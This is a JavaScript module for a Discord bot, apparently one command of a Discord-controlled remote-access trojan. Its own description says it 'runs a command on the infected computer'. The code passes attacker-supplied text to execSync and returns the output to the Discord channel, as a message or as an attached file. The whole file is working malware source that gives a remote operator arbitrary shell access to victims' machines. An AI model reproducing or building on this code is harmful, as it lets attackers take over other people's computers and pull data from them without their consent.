const { SlashCommandBuilder, AttachmentBuilder } = require('discord.js');
const { execSync } = require('child_process');

module.exports = {
  data: new SlashCommandBuilder()
    .setName('run')
    .setDescription('Runs a command on the infected computer')
    .addStringOption(option => option
      .setName('command')
      .setDescription('The command to run')
      .setRequired(true)
    )
    .setDMPermission(false),

  async run(message, client, args, legacyMsg) {
    !legacyMsg && message.deferReply();
    console.log(legacyMsg ? 'reply' : 'editReply');
    try {
      const command = await execSync(legacyMsg ? args.join(' ') : args.getString('command'));
      console.log(command.length);
      if (command && command.length > 0 && command.length < 2000) {
        await message[legacyMsg ? 'reply' : 'editReply']({
          content: `\`\`\`${command.toString().trim()}\`\`\``
        });
      } else if (command && command.length >= 2000) {
        await message[legacyMsg ? 'reply' : 'editReply']({
          files: [
            new AttachmentBuilder(command, { name: 'output.txt' })
          ]
        });
      } else {
        legacyMsg ? await message.react('✅') : await message.editReply({ content: '✅' });
      }
    } catch (e) {
      await message[legacyMsg ? 'reply' : 'editReply']({
        content: `\`\`\`${e.message}\`\`\``, ephemeral: true
      });
    }
  }
}
